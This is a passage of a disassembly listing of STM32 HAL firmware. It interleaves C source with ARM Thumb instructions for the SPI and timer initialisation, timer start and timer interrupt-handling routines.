 8004b54:	4b05      	ldr	r3, [pc, #20]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b56:	691a      	ldr	r2, [r3, #16]
 8004b58:	687b      	ldr	r3, [r7, #4]
 8004b5a:	699b      	ldr	r3, [r3, #24]
 8004b5c:	4903      	ldr	r1, [pc, #12]	; (8004b6c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b5e:	4313      	orrs	r3, r2
 8004b60:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004b62:	7bfb      	ldrb	r3, [r7, #15]
}
 8004b64:	4618      	mov	r0, r3
 8004b66:	3710      	adds	r7, #16
 8004b68:	46bd      	mov	sp, r7
 8004b6a:	bd80      	pop	{r7, pc}
 8004b6c:	40021000 	.word	0x40021000

08004b70 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004b70:	b580      	push	{r7, lr}
 8004b72:	b084      	sub	sp, #16
 8004b74:	af00      	add	r7, sp, #0
 8004b76:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004b78:	687b      	ldr	r3, [r7, #4]
 8004b7a:	2b00      	cmp	r3, #0
 8004b7c:	d101      	bne.n	8004b82 <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004b7e:	2301      	movs	r3, #1
 8004b80:	e095      	b.n	8004cae <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004b82:	687b      	ldr	r3, [r7, #4]
 8004b84:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004b86:	2b00      	cmp	r3, #0
 8004b88:	d108      	bne.n	8004b9c <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004b8a:	687b      	ldr	r3, [r7, #4]
 8004b8c:	685b      	ldr	r3, [r3, #4]
 8004b8e:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004b92:	d009      	beq.n	8004ba8 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004b94:	687b      	ldr	r3, [r7, #4]
 8004b96:	2200      	movs	r2, #0
 8004b98:	61da      	str	r2, [r3, #28]
 8004b9a:	e005      	b.n	8004ba8 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004b9c:	687b      	ldr	r3, [r7, #4]
 8004b9e:	2200      	movs	r2, #0
 8004ba0:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004ba2:	687b      	ldr	r3, [r7, #4]
 8004ba4:	2200      	movs	r2, #0
 8004ba6:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004ba8:	687b      	ldr	r3, [r7, #4]
 8004baa:	2200      	movs	r2, #0
 8004bac:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004bae:	687b      	ldr	r3, [r7, #4]
 8004bb0:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004bb4:	b2db      	uxtb	r3, r3
 8004bb6:	2b00      	cmp	r3, #0
 8004bb8:	d106      	bne.n	8004bc8 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004bba:	687b      	ldr	r3, [r7, #4]
 8004bbc:	2200      	movs	r2, #0
 8004bbe:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004bc2:	6878      	ldr	r0, [r7, #4]
 8004bc4:	f7fc f8cc 	bl	8000d60 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004bc8:	687b      	ldr	r3, [r7, #4]
 8004bca:	2202      	movs	r2, #2
 8004bcc:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004bd0:	687b      	ldr	r3, [r7, #4]
 8004bd2:	681b      	ldr	r3, [r3, #0]
 8004bd4:	681a      	ldr	r2, [r3, #0]
 8004bd6:	687b      	ldr	r3, [r7, #4]
 8004bd8:	681b      	ldr	r3, [r3, #0]
 8004bda:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004bde:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004be0:	687b      	ldr	r3, [r7, #4]
 8004be2:	68db      	ldr	r3, [r3, #12]
 8004be4:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004be8:	d902      	bls.n	8004bf0 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004bea:	2300      	movs	r3, #0
 8004bec:	60fb      	str	r3, [r7, #12]
 8004bee:	e002      	b.n	8004bf6 <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004bf0:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004bf4:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004bf6:	687b      	ldr	r3, [r7, #4]
 8004bf8:	68db      	ldr	r3, [r3, #12]
 8004bfa:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004bfe:	d007      	beq.n	8004c10 <HAL_SPI_Init+0xa0>
 8004c00:	687b      	ldr	r3, [r7, #4]
 8004c02:	68db      	ldr	r3, [r3, #12]
 8004c04:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004c08:	d002      	beq.n	8004c10 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004c0a:	687b      	ldr	r3, [r7, #4]
 8004c0c:	2200      	movs	r2, #0
 8004c0e:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004c10:	687b      	ldr	r3, [r7, #4]
 8004c12:	685b      	ldr	r3, [r3, #4]
 8004c14:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004c18:	687b      	ldr	r3, [r7, #4]
 8004c1a:	689b      	ldr	r3, [r3, #8]
 8004c1c:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004c20:	431a      	orrs	r2, r3
 8004c22:	687b      	ldr	r3, [r7, #4]
 8004c24:	691b      	ldr	r3, [r3, #16]
 8004c26:	f003 0302 	and.w	r3, r3, #2
 8004c2a:	431a      	orrs	r2, r3
 8004c2c:	687b      	ldr	r3, [r7, #4]
 8004c2e:	695b      	ldr	r3, [r3, #20]
 8004c30:	f003 0301 	and.w	r3, r3, #1
 8004c34:	431a      	orrs	r2, r3
 8004c36:	687b      	ldr	r3, [r7, #4]
 8004c38:	699b      	ldr	r3, [r3, #24]
 8004c3a:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004c3e:	431a      	orrs	r2, r3
 8004c40:	687b      	ldr	r3, [r7, #4]
 8004c42:	69db      	ldr	r3, [r3, #28]
 8004c44:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004c48:	431a      	orrs	r2, r3
 8004c4a:	687b      	ldr	r3, [r7, #4]
 8004c4c:	6a1b      	ldr	r3, [r3, #32]
 8004c4e:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004c52:	ea42 0103 	orr.w	r1, r2, r3
 8004c56:	687b      	ldr	r3, [r7, #4]
 8004c58:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004c5a:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004c5e:	687b      	ldr	r3, [r7, #4]
 8004c60:	681b      	ldr	r3, [r3, #0]
 8004c62:	430a      	orrs	r2, r1
 8004c64:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004c66:	687b      	ldr	r3, [r7, #4]
 8004c68:	699b      	ldr	r3, [r3, #24]
 8004c6a:	0c1b      	lsrs	r3, r3, #16
 8004c6c:	f003 0204 	and.w	r2, r3, #4
 8004c70:	687b      	ldr	r3, [r7, #4]
 8004c72:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004c74:	f003 0310 	and.w	r3, r3, #16
 8004c78:	431a      	orrs	r2, r3
 8004c7a:	687b      	ldr	r3, [r7, #4]
 8004c7c:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004c7e:	f003 0308 	and.w	r3, r3, #8
 8004c82:	431a      	orrs	r2, r3
 8004c84:	687b      	ldr	r3, [r7, #4]
 8004c86:	68db      	ldr	r3, [r3, #12]
 8004c88:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004c8c:	ea42 0103 	orr.w	r1, r2, r3
 8004c90:	68fb      	ldr	r3, [r7, #12]
 8004c92:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004c96:	687b      	ldr	r3, [r7, #4]
 8004c98:	681b      	ldr	r3, [r3, #0]
 8004c9a:	430a      	orrs	r2, r1
 8004c9c:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004c9e:	687b      	ldr	r3, [r7, #4]
 8004ca0:	2200      	movs	r2, #0
 8004ca2:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004ca4:	687b      	ldr	r3, [r7, #4]
 8004ca6:	2201      	movs	r2, #1
 8004ca8:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004cac:	2300      	movs	r3, #0
}
 8004cae:	4618      	mov	r0, r3
 8004cb0:	3710      	adds	r7, #16
 8004cb2:	46bd      	mov	sp, r7
 8004cb4:	bd80      	pop	{r7, pc}

08004cb6 <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004cb6:	b580      	push	{r7, lr}
 8004cb8:	b082      	sub	sp, #8
 8004cba:	af00      	add	r7, sp, #0
 8004cbc:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004cbe:	687b      	ldr	r3, [r7, #4]
 8004cc0:	2b00      	cmp	r3, #0
 8004cc2:	d101      	bne.n	8004cc8 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004cc4:	2301      	movs	r3, #1
 8004cc6:	e049      	b.n	8004d5c <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004cc8:	687b      	ldr	r3, [r7, #4]
 8004cca:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004cce:	b2db      	uxtb	r3, r3
 8004cd0:	2b00      	cmp	r3, #0
 8004cd2:	d106      	bne.n	8004ce2 <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004cd4:	687b      	ldr	r3, [r7, #4]
 8004cd6:	2200      	movs	r2, #0
 8004cd8:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004cdc:	6878      	ldr	r0, [r7, #4]
 8004cde:	f7fc f943 	bl	8000f68 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004ce2:	687b      	ldr	r3, [r7, #4]
 8004ce4:	2202      	movs	r2, #2
 8004ce6:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004cea:	687b      	ldr	r3, [r7, #4]
 8004cec:	681a      	ldr	r2, [r3, #0]
 8004cee:	687b      	ldr	r3, [r7, #4]
 8004cf0:	3304      	adds	r3, #4
 8004cf2:	4619      	mov	r1, r3
 8004cf4:	4610      	mov	r0, r2
 8004cf6:	f000 fa7d 	bl	80051f4 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004cfa:	687b      	ldr	r3, [r7, #4]
 8004cfc:	2201      	movs	r2, #1
 8004cfe:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004d02:	687b      	ldr	r3, [r7, #4]
 8004d04:	2201      	movs	r2, #1
 8004d06:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004d0a:	687b      	ldr	r3, [r7, #4]
 8004d0c:	2201      	movs	r2, #1
 8004d0e:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004d12:	687b      	ldr	r3, [r7, #4]
 8004d14:	2201      	movs	r2, #1
 8004d16:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004d1a:	687b      	ldr	r3, [r7, #4]
 8004d1c:	2201      	movs	r2, #1
 8004d1e:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004d22:	687b      	ldr	r3, [r7, #4]
 8004d24:	2201      	movs	r2, #1
 8004d26:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004d2a:	687b      	ldr	r3, [r7, #4]
 8004d2c:	2201      	movs	r2, #1
 8004d2e:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004d32:	687b      	ldr	r3, [r7, #4]
 8004d34:	2201      	movs	r2, #1
 8004d36:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004d3a:	687b      	ldr	r3, [r7, #4]
 8004d3c:	2201      	movs	r2, #1
 8004d3e:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004d42:	687b      	ldr	r3, [r7, #4]
 8004d44:	2201      	movs	r2, #1
 8004d46:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004d4a:	687b      	ldr	r3, [r7, #4]
 8004d4c:	2201      	movs	r2, #1
 8004d4e:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004d52:	687b      	ldr	r3, [r7, #4]
 8004d54:	2201      	movs	r2, #1
 8004d56:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004d5a:	2300      	movs	r3, #0
}
 8004d5c:	4618      	mov	r0, r3
 8004d5e:	3708      	adds	r7, #8
 8004d60:	46bd      	mov	sp, r7
 8004d62:	bd80      	pop	{r7, pc}

08004d64 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004d64:	b480      	push	{r7}
 8004d66:	b085      	sub	sp, #20
 8004d68:	af00      	add	r7, sp, #0
 8004d6a:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004d6c:	687b      	ldr	r3, [r7, #4]
 8004d6e:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004d72:	b2db      	uxtb	r3, r3
 8004d74:	2b01      	cmp	r3, #1
 8004d76:	d001      	beq.n	8004d7c <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004d78:	2301      	movs	r3, #1
 8004d7a:	e03b      	b.n	8004df4 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004d7c:	687b      	ldr	r3, [r7, #4]
 8004d7e:	2202      	movs	r2, #2
 8004d80:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004d84:	687b      	ldr	r3, [r7, #4]
 8004d86:	681b      	ldr	r3, [r3, #0]
 8004d88:	68da      	ldr	r2, [r3, #12]
 8004d8a:	687b      	ldr	r3, [r7, #4]
 8004d8c:	681b      	ldr	r3, [r3, #0]
 8004d8e:	f042 0201 	orr.w	r2, r2, #1
 8004d92:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004d94:	687b      	ldr	r3, [r7, #4]
 8004d96:	681b      	ldr	r3, [r3, #0]
 8004d98:	4a19      	ldr	r2, [pc, #100]	; (8004e00 <HAL_TIM_Base_Start_IT+0x9c>)
 8004d9a:	4293      	cmp	r3, r2
 8004d9c:	d009      	beq.n	8004db2 <HAL_TIM_Base_Start_IT+0x4e>
 8004d9e:	687b      	ldr	r3, [r7, #4]
 8004da0:	681b      	ldr	r3, [r3, #0]
 8004da2:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004da6:	d004      	beq.n	8004db2 <HAL_TIM_Base_Start_IT+0x4e>
 8004da8:	687b      	ldr	r3, [r7, #4]
 8004daa:	681b      	ldr	r3, [r3, #0]
 8004dac:	4a15      	ldr	r2, [pc, #84]	; (8004e04 <HAL_TIM_Base_Start_IT+0xa0>)
 8004dae:	4293      	cmp	r3, r2
 8004db0:	d115      	bne.n	8004dde <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004db2:	687b      	ldr	r3, [r7, #4]
 8004db4:	681b      	ldr	r3, [r3, #0]
 8004db6:	689a      	ldr	r2, [r3, #8]
 8004db8:	4b13      	ldr	r3, [pc, #76]	; (8004e08 <HAL_TIM_Base_Start_IT+0xa4>)
 8004dba:	4013      	ands	r3, r2
 8004dbc:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004dbe:	68fb      	ldr	r3, [r7, #12]
 8004dc0:	2b06      	cmp	r3, #6
 8004dc2:	d015      	beq.n	8004df0 <HAL_TIM_Base_Start_IT+0x8c>
 8004dc4:	68fb      	ldr	r3, [r7, #12]
 8004dc6:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004dca:	d011      	beq.n	8004df0 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004dcc:	687b      	ldr	r3, [r7, #4]
 8004dce:	681b      	ldr	r3, [r3, #0]
 8004dd0:	681a      	ldr	r2, [r3, #0]
 8004dd2:	687b      	ldr	r3, [r7, #4]
 8004dd4:	681b      	ldr	r3, [r3, #0]
 8004dd6:	f042 0201 	orr.w	r2, r2, #1
 8004dda:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004ddc:	e008      	b.n	8004df0 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	681b      	ldr	r3, [r3, #0]
 8004de2:	681a      	ldr	r2, [r3, #0]
 8004de4:	687b      	ldr	r3, [r7, #4]
 8004de6:	681b      	ldr	r3, [r3, #0]
 8004de8:	f042 0201 	orr.w	r2, r2, #1
 8004dec:	601a      	str	r2, [r3, #0]
 8004dee:	e000      	b.n	8004df2 <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004df0:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004df2:	2300      	movs	r3, #0
}
 8004df4:	4618      	mov	r0, r3
 8004df6:	3714      	adds	r7, #20
 8004df8:	46bd      	mov	sp, r7
 8004dfa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004dfe:	4770      	bx	lr
 8004e00:	40012c00 	.word	0x40012c00
 8004e04:	40014000 	.word	0x40014000
 8004e08:	00010007 	.word	0x00010007

08004e0c <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004e0c:	b580      	push	{r7, lr}
 8004e0e:	b084      	sub	sp, #16
 8004e10:	af00      	add	r7, sp, #0
 8004e12:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004e14:	687b      	ldr	r3, [r7, #4]
 8004e16:	681b      	ldr	r3, [r3, #0]
 8004e18:	68db      	ldr	r3, [r3, #12]
 8004e1a:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004e1c:	687b      	ldr	r3, [r7, #4]
 8004e1e:	681b      	ldr	r3, [r3, #0]
 8004e20:	691b      	ldr	r3, [r3, #16]
 8004e22:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004e24:	68bb      	ldr	r3, [r7, #8]
 8004e26:	f003 0302 	and.w	r3, r3, #2
 8004e2a:	2b00      	cmp	r3, #0
 8004e2c:	d020      	beq.n	8004e70 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004e2e:	68fb      	ldr	r3, [r7, #12]
 8004e30:	f003 0302 	and.w	r3, r3, #2
 8004e34:	2b00      	cmp	r3, #0
 8004e36:	d01b      	beq.n	8004e70 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004e38:	687b      	ldr	r3, [r7, #4]
 8004e3a:	681b      	ldr	r3, [r3, #0]
 8004e3c:	f06f 0202 	mvn.w	r2, #2
 8004e40:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004e42:	687b      	ldr	r3, [r7, #4]
 8004e44:	2201      	movs	r2, #1
 8004e46:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004e48:	687b      	ldr	r3, [r7, #4]
 8004e4a:	681b      	ldr	r3, [r3, #0]
 8004e4c:	699b      	ldr	r3, [r3, #24]
 8004e4e:	f003 0303 	and.w	r3, r3, #3
 8004e52:	2b00      	cmp	r3, #0
 8004e54:	d003      	beq.n	8004e5e <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004e56:	6878      	ldr	r0, [r7, #4]
 8004e58:	f000 f9ad 	bl	80051b6 <HAL_TIM_IC_CaptureCallback>
 8004e5c:	e005      	b.n	8004e6a <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e5e:	6878      	ldr	r0, [r7, #4]
 8004e60:	f000 f99f 	bl	80051a2 <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e64:	6878      	ldr	r0, [r7, #4]
 8004e66:	f000 f9b0 	bl	80051ca <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e6a:	687b      	ldr	r3, [r7, #4]
 8004e6c:	2200      	movs	r2, #0
 8004e6e:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004e70:	68bb      	ldr	r3, [r7, #8]
 8004e72:	f003 0304 	and.w	r3, r3, #4
 8004e76:	2b00      	cmp	r3, #0
 8004e78:	d020      	beq.n	8004ebc <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004e7a:	68fb      	ldr	r3, [r7, #12]
 8004e7c:	f003 0304 	and.w	r3, r3, #4
 8004e80:	2b00      	cmp	r3, #0
 8004e82:	d01b      	beq.n	8004ebc <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004e84:	687b      	ldr	r3, [r7, #4]
 8004e86:	681b      	ldr	r3, [r3, #0]
 8004e88:	f06f 0204 	mvn.w	r2, #4
 8004e8c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004e8e:	687b      	ldr	r3, [r7, #4]
 8004e90:	2202      	movs	r2, #2
 8004e92:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004e94:	687b      	ldr	r3, [r7, #4]
 8004e96:	681b      	ldr	r3, [r3, #0]
 8004e98:	699b      	ldr	r3, [r3, #24]
 8004e9a:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004e9e:	2b00      	cmp	r3, #0
 8004ea0:	d003      	beq.n	8004eaa <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004ea2:	6878      	ldr	r0, [r7, #4]
 8004ea4:	f000 f987 	bl	80051b6 <HAL_TIM_IC_CaptureCallback>
 8004ea8:	e005      	b.n	8004eb6 <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004eaa:	6878      	ldr	r0, [r7, #4]
 8004eac:	f000 f979 	bl	80051a2 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004eb0:	6878      	ldr	r0, [r7, #4]
 8004eb2:	f000 f98a 	bl	80051ca <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004eb6:	687b      	ldr	r3, [r7, #4]
 8004eb8:	2200      	movs	r2, #0
 8004eba:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
